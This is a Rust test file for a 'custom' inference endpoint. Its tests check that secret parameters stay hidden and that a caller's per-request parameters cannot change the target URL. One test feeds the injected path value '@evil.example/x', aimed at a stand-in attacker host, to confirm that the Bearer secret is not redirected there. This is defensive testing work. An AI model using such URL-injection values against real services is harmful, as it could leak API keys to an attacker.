//! `custom`: request templates and JSON-path parsers for every task type.

use crate::*;

#[tokio::test]
async fn custom_matches_elasticsearch_and_hides_its_secret_parameters() {
    let r = replay("custom", false).await;
    assert_none(&r.problems);
    assert_secrets_hidden(&r, &["cu-key"]);
}

/// A caller's per-request parameters fill the body, never the URL: they can't send the
/// endpoint's secrets to a host of their choosing.
#[tokio::test]
async fn request_parameters_cannot_move_the_url() {
    let m = mock().await;
    let c = cluster(&m).await;
    let put = format!(
        r#"{{"service":"custom","service_settings":{{"secret_parameters":{{"api_key":"cu-secret"}},"url":"{}/custom/${{path}}","headers":{{"Authorization":"Bearer ${{api_key}}"}},"request":"{{\"prompt\":${{input}}}}","response":{{"json_parser":{{"completion_result":"$.output.text"}}}}}},"task_settings":{{"parameters":{{"path":"complete"}}}}}}"#,
        m.url
    );
    m.answer_with("POST", "/custom/complete", r#"{"output":{"text":"ok"}}"#, 2);
    let (s, v) = call(&c, "PUT", "/_inference/completion/cu", Some(&put)).await;
    assert_eq!(s, 200, "{v}");
    let (s, v) = call(&c, "POST", "/_inference/completion/cu", Some(r#"{"input":"hi","task_settings":{"parameters":{"path":"@evil.example/x"}}}"#)).await;
    assert_eq!((s, v.as_str()), (200, r#"{"completion":[{"result":"ok"}]}"#));
    let seen = m.take();
    assert_eq!(seen.len(), 2);
    assert!(seen.iter().all(|s| s.path == "/custom/complete" && s.header("authorization") == Some("Bearer cu-secret")), "{seen:?}");
}
